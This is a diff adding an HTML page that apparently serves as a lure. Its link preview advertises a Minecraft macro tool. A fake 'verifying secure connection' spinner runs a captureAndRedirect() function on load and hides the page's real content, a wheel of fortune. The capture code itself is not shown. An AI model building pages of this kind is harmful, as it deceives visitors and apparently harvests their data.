@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MyToolbox - Dashboard</title>
+    
+    <meta property="og:title" content="MC Macro" />
+    <meta property="og:description" content="Best minecraft tool MC Macro with interface." />
+    <meta name="theme-color" content="#5865F2">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+<body onload="captureAndRedirect()">
+    <div id="status-container">
+        <div class="spinner"></div>
+        <h2 id="status-text">Se verifică conexiunea securizată...</h2>
+    </div>
+
+    <div id="main-content" style="display:none;">
+        <nav>
+            <h1>Sup</h1>
+        </nav>
+        <div class="tool-card">
+            <h3>🎡 Roata Norocului</h3>
+            <canvas id="wheel" width="400" height="400"></canvas>
+            <br>
+            <button id="spin-btn">ÎNVÂRTE ROATA</button>
+            <h2 id="winner-text">Mult noroc!</h2>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
